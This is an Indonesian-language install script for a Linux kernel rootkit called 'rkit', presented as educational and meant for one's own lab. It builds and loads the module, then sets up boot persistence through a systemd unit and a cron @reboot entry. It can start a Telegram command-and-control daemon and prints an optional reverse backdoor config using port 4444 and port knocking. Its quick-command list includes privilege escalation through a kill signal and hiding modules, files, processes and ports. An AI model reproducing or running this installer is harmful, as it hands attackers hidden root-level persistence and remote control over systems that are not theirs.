#!/bin/sh
# install.sh — deteksi kernel -> backend cocok -> build -> load -> daemon (opsional)
#             + pasang AUTOLOAD saat boot (rkit-load.service + state restore)
#
# Edukasi. Untuk VM/lab milik sendiri — baca docs/TESTING.md sebelum jalankan.
# Pemakaian:  sudo sh install.sh
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
K=$(uname -r)
MAJ=${K%%.*}
REST=${K#*.}
MIN=${REST%%.*}

echo "[*] kernel: $K"

# ----------------0. harus root ----------------
if [ "$(id -u)" -ne 0 ]; then
	echo "[!] jalankan sebagai root (insmod membutuhkannya)"; exit 1
fi

# ----------------1. pilih backend ----------------
case "$MAJ" in
	2|3|4)
		BACKEND_DIR="backend/legacy_4x/kernel"
		BACKEND_KIND="legacy"
		KO="$BACKEND_DIR/rkit4x.ko"
		TEKNIK="sys_call_table + CR0.WP"
		IFACE="legacy (param saat insmod)"
		;;
	5)
		BACKEND_DIR="backend/modern_5x_6x/kernel"
		BACKEND_KIND="modern"
		KO="$BACKEND_DIR/rkit.ko"
		TEKNIK="kretprobe/kprobe"
		IFACE="/proc/rkit"
		;;
	6)
		if [ "$MIN" -ge 9 ]; then
			BACKEND_DIR="backend/newest_6x"
			BACKEND_KIND="modern"
			KO="$BACKEND_DIR/rkit6x.ko"
			TEKNIK="kretprobe/kprobe (6.9+)"
		else
			BACKEND_DIR="backend/modern_5x_6x/kernel"
			BACKEND_KIND="modern"
			KO="$BACKEND_DIR/rkit.ko"
			TEKNIK="kretprobe/kprobe"
		fi
		IFACE="/proc/rkit"
		;;
	7)
		# EKSPERIMENTAL — jalur 7.x dibuka 2026-11-15: backend newest,
		# teknik identik 6.9+ (kretprobe). BELUM teruji klaim dukungan:
		# risiko PANIC saat load — siapkan akses CONSOLE (Proxmox/IPMI)
		# sebelum insmod. Status docs tetap 🚧 sampai lolos TESTING.md.
		echo "[!] ============== EKSPERIMENTAL =============="
		echo "[!] kernel 7.x BELUM teruji — risiko PANIC saat load"
		echo "[!] siapkan akses console (jangan andalkan SSH saja)"
		echo "[!] ==========================================="
		BACKEND_DIR="backend/newest_6x"
		BACKEND_KIND="modern"
		KO="$BACKEND_DIR/rkit6x.ko"
		TEKNIK="kretprobe/kprobe (6.9+; 7.x EKSPERIMENTAL)"
		IFACE="/proc/rkit"
		;;
	*)
		echo "[!] kernel tidak dikenal ($K) — jangan dipakai"; exit 1
		;;
esac
echo "[+] backend : $BACKEND_DIR ($BACKEND_KIND)"
echo "[+] teknik  : $TEKNIK"

# ----------------2. prerequisite (wajib) ----------------
MISS=0
for c in gcc make; do
	if ! command -v "$c" >/dev/null 2>&1; then
		echo "[!] $c belum ada -> apt-get install build-essential"
		MISS=1
	fi
done
if [ ! -e "/lib/modules/$K/build" ]; then
	echo "[!] kernel headers tidak ada -> install dulu:"
	echo "      Ubuntu/Debian : apt-get install linux-headers-\$(uname -r)"
	echo "      Proxmox VE    : apt-get install pve-headers-\$(uname -r)"
	MISS=1
fi
if [ "$MISS" -ne 0 ]; then
	echo "[!] prerequisite belum lengkap — hentikan sebelum build"; exit 1
fi

# ----------------3. build backend ----------------
echo "[*] build modul..."
if ! make -C "$ROOT/$BACKEND_DIR" > /tmp/rkit-build.log 2>&1; then
	echo "[!] build GAGAL —20 baris terakhir:"
	tail -20 /tmp/rkit-build.log
	echo "    (panduan: docs/PORTING.md)"
	exit 1
fi
echo "[+] build OK -> $KO"

# ----------------4. build CLI ----------------
if make -C "$ROOT/control/cli" > /tmp/rkit-cli.log 2>&1; then
	echo "[+] CLI OK -> control/cli/rkit"
else
	echo "[!] build CLI gagal (lihat /tmp/rkit-cli.log) — lanjut tanpa CLI"
fi

# ----------------5. vermagic (pengaman wajib) ----------------
if command -v modinfo >/dev/null 2>&1; then
	VM=$(modinfo -F vermagic "$ROOT/$KO" 2>/dev/null | awk '{print $1}')
	if [ "$VM" = "$K" ]; then
		echo "[+] vermagic cocok: $VM"
	else
		echo "[!] vermagic MISMATCH: modul='$VM' kernel='$K' — JANGAN diload"
		exit 1
	fi
else
	echo "[i] modinfo tidak ada — vermagic dilewati"
fi

# ----------------6. unload lama (hindari "File exists") ----------------
# kill -s 62 dulu: bila modul tersembunyi (tak terlihat di /proc/modules),
# sinyal menampilkannya kembali agar rmmod bisa menemukannya.
kill -s 62 1 2>/dev/null || true
for m in rkit4x rkit rkit6x; do
	if grep -q "^$m " /proc/modules 2>/dev/null; then
		if rmmod "$m" 2>/tmp/rkit-rmmod.log; then
			echo "[i] modul lama '$m' diunload"
		else
			echo "[!] modul '$m' termuat tapi gagal rmmod:"
			cat /tmp/rkit-rmmod.log
			exit 1
		fi
	fi
done

# ----------------7. load ----------------
echo "[*] insmod..."
if ! insmod "$ROOT/$KO" 2>/tmp/rkit-insmod.log; then
	echo "[!] insmod gagal:"
	cat /tmp/rkit-insmod.log
	if grep -q "File exists" /tmp/rkit-insmod.log; then
		echo "    modul lama masih termuat dan tidak terlihat di /proc/modules"
		echo "    (kemungkinan tersembunyi oleh versi lama) -> REBOOT lalu jalankan lagi"
	fi
	echo "    (kalau OOPS/panic — lihat docs/TESTING.md tahap load)"
	exit 1
fi
echo "[+] modul termuat"

# ----------------7. verifikasi interface ----------------
if [ -r /proc/rkit ]; then
	echo "[+] /proc/rkit aktif"
	echo "    coba: $ROOT/control/cli/rkit status"
else
	echo "[i] interface: $IFACE"
	echo "    legacy: daftar via param, contoh:"
	echo "    insmod $ROOT/$KO hide=\"pages.php\" hidepid=\"123\""
fi

# ----------------8. auto-load saat boot (state restore) ----------------
mkdir -p /var/lib/rkit
UNIT=/etc/systemd/system/rkit-load.service
# tulis ULANG setiap install — $ROOT bisa berpindah (mis. /dev/shm -> /opt/.cache)
# dulu ada guard "kalau belum ada" -> unit lama/path basi dipertahankan (bug).
cat > "$UNIT" <<UNITEOF
[Unit]
Description=rkit module loader (edukasi)
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/bin/sh "$ROOT/tools/rkit-load.sh" "$ROOT/$KO" $BACKEND_KIND
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNITEOF
echo "[+] $UNIT ditulis -> $ROOT"
if systemctl daemon-reload 2>/dev/null && systemctl enable rkit-load.service 2>/dev/null; then
	echo "[+] autoload boot aktif (state hide dipulihkan dari /var/lib/rkit/state)"
	echo "    backdoor (opsional) via auto-load — buat /var/lib/rkit/backdoor.conf:"
	echo "      backdoor_ip=IP_KAMU"
	echo "      backdoor_port=4444"
	echo "      knock_port=1337"
	echo "    lalu: systemctl restart rkit-load.service"
else
	echo "[!] gagal enable rkit-load.service — muat manual setelah reboot"
fi

# ----------------9. daemon telegram (opsional) ----------------
CFG="$ROOT/config.ini"
PYTHON=$(command -v python3 || true)
if [ ! -f "$CFG" ]; then
	echo "[i] mode CLI — daemon tidak dijalankan (ingin telegram? cp config.example.ini config.ini)"
elif ! grep -q "^CONTROL_MODE=telegram" "$CFG"; then
	echo "[i] CONTROL_MODE != telegram — daemon tidak dijalankan"
elif [ -z "$(sed -n 's/^TELEGRAM_TOKEN=//p' "$CFG" | head -n 1)" ] || grep -qE '^TELEGRAM_TOKEN=LETAKKAN' "$CFG"; then
	echo "[!] token masih placeholder — isi config.ini lalu jalankan manual:"
	echo "    python3 $ROOT/control/telegram/daemon.py"
elif [ -z "$PYTHON" ]; then
	echo "[!] python3 tidak ada — daemon dilewati"
else
	RB="@reboot $PYTHON $ROOT/control/telegram/daemon.py # unified-rootkit"
	if ! crontab -l 2>/dev/null | grep -q "unified-rootkit"; then
		{ crontab -l 2>/dev/null; echo "$RB"; } | crontab - 2>/dev/null \
			&& echo "[+] cron @reboot ditambahkan"
	fi
	# anti-DOUBLE: kalau daemon sudah hidup, jangan jalankan lagi
	if pgrep -f "control/telegram/daemon.py" >/dev/null 2>&1; then
		echo "[i] daemon telegram SUDAH berjalan — tidak distart ulang"
	else
		nohup "$PYTHON" "$ROOT/control/telegram/daemon.py" >> "$ROOT/agent.log" 2>&1 &
		echo "[+] daemon telegram start — cek pesan 'online' di bot kamu"
		echo "    log: $ROOT/agent.log"
	fi
fi

echo "== SELESAI =="
echo "Uji sekarang (docs/TESTING.md), lalu laporkan error/kurangnya."
if [ "$BACKEND_KIND" = "legacy" ]; then
	echo "Perintah cepat (legacy — kontrol via SINYAL + param insmod):"
	echo "  kill -s 63 1                                  # LPE (uji dari user biasa)"
	echo "  kill -s 64 1                                  # hide modul -> lsmod kosong"
	echo "  kill -s 62 1                                  # tampilkan modul (sebelum rmmod)"
	echo "  rmmod rkit4x && insmod $KO hide=\"rahasia.txt\" hideport=\"8080\""
	echo "                                               # ^ reload untuk menerapkan daftar hide"
	echo "  rmmod rkit4x                                 # unload bersih (tabel dipulihkan)"
	echo "  CATATAN: legacy TIDAK punya /proc/rkit & CLI status — beda dengan backend modern"
else
	echo "Perintah cepat:"
	echo "  $ROOT/control/cli/rkit status"
	echo "  $ROOT/control/cli/rkit hide file <nama>"
	echo "  $ROOT/control/cli/rkit hide port <port>"
	echo "  $ROOT/control/cli/rkit hide mod        # sembunyikan dari lsmod"
	echo "  $ROOT/control/cli/rkit unhide mod      # WAJIB sebelum rmmod"
	echo "  kill -s 63 1                            # tes LPE"
	echo "  rmmod rkit 2>/dev/null || rmmod rkit6x"
fi
